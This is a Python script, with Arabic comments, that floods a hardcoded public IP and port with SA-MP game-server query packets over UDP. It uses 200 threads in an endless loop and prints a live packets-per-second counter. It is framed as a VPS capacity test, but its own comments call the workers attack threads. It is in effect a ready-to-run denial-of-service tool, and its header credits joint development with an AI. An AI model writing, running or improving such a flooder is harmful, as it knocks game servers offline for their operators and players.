import socket
import struct
import time
import threading
import sys

# ==========================================
# أداة اختبار الحد الأقصى للـ VPS (Max Throttle SAMP Tool)
# تطوير مشترك: هشام & الذكاء الاصطناعي
# ==========================================

TARGET_IP = "51.68.107.75"
TARGET_PORT = 16498

# فتحنا عدد خيوط ضخم (Threads) باش نضغطو على الماكس تاع الـ VPS والشبكة
THREADS_COUNT = 200  

total_packets_sent = 0
lock = threading.Lock()
is_running = True

def generate_samp_payload(ip, port):
    try:
        ip_bytes = socket.inet_aton(ip)
        port_bytes = struct.pack('<H', int(port))
        return b'SAMP' + ip_bytes + port_bytes + b'i'
    except Exception:
        return None

def max_stress_worker(target_ip, target_port, payload):
    global total_packets_sent, is_running
    
    # إنشاء سوكيت UDP بدون أي تأخير
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # رفع حجم البفر الداخلي للسوكيت باش يتحمل السرعة الجنونية
        client.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
    except Exception:
        return

    local_count = 0
    
    # حلقة مفتوحة بلا توقف وبلا وقت محدد، تطلق بأقصى ما يقدر المعالج يخدم
    while is_running:
        try:
            client.sendto(payload, (target_ip, target_port))
            local_count += 1
            
            # كل 5000 حزمة نحدثوا العداد العام باش ما نبطئوش حلقة الإرسال
            if local_count >= 5000:
                with lock:
                    total_packets_sent += local_count
                local_count = 0
        except Exception:
            continue
            
    try:
        client.close()
    except:
        pass
        
    if local_count > 0:
        with lock:
            total_packets_sent += local_count

def live_speed_monitor():
    """مراقبة عدد الحزم في كل ثانية (PPS) لمعرفة كمية الضخ الحقيقية للـ VPS"""
    global total_packets_sent, is_running
    last_count = 0
    start_time = time.time()
    
    while is_running:
        time.sleep(1.0)
        with lock:
            current_total = total_packets_sent
            
        pps = current_total - last_count
        last_count = current_total
        elapsed = int(time.time() - start_time)
        
        sys.stdout.write(f"\r[⚡] السرعة الآن: {pps:,} باكت في الثانية (PPS) | الإجمالي المرسل: {current_total:,} | الوقت: {elapsed}ث     ")
        sys.stdout.flush()

def run_max_test():
    global is_running
    
    payload = generate_samp_payload(TARGET_IP, TARGET_PORT)
    if not payload:
        print("[-] خطأ في تكوين الحزمة.")
        return

    print("=" * 60)
    print("   [🔥] اختبار الحد الأقصى للـ VPS (Max Capacity Test)")
    print("=" * 60)
    print(f"[*] الهدف المستهدف : {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] الخيوط النشطة  : {THREADS_COUNT} Threads (أقصى ضغط)")
    print("[*] اضغط على Ctrl+C لإيقاف الاختبار ورؤية النتيجة النهائية.")
    print("=" * 60)

    # تشغيل خيط مراقبة السرعة الحية (PPS)
    monitor_thread = threading.Thread(target=live_speed_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()

    threads = []
    # إطلاق خيوط الهجوم المفتوحة
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=max_stress_worker, args=(TARGET_IP, TARGET_PORT, payload))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while is_running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الاختبار يدوياً.")
        is_running = False

    # انتظار إنهاء الخيوط بأمان
    for t in threads:
        t.join(timeout=0.1)

    print("\n" + "=" * 60)
    print("[✅] انتهى الاختبار بنجاح!")
    print(f"[📊] إجمالي الحزم الضخمة المرسلة: {total_packets_sent:,} حزمة.")
    print("=" * 60)

if __name__ == "__main__":
    run_max_test()
    